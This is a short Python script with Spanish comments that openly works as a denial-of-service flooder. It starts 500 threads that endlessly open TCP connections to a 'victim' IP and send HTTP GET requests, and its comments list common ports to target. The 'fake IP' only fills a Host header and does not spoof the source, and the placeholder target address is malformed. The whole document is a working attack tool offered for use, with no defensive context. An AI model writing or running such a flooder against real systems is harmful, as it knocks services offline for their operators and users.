import socket
import threading

target_ip = "9.9.9.9.9"  # La ip de la victima
target_port = 80  # Puerto 
# Puerto 80: Para HTTP trafico de la web. Por defecto
# Puerto 443: Para HTTPS (una web segura).
# Puerto 53: Para DNS servicios.
# Puerto 22: Para SSH.
# Puerto 25: Para SMTP servicios de email.
fake_ip = "182.21.20.32"  # Reemplazar con una dirección IP falsificada
threads = 500  # Número de subprocesos a utilizar

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (target_ip, target_port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target_ip, target_port))
            s.close()
        except Exception as e:
            pass

for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
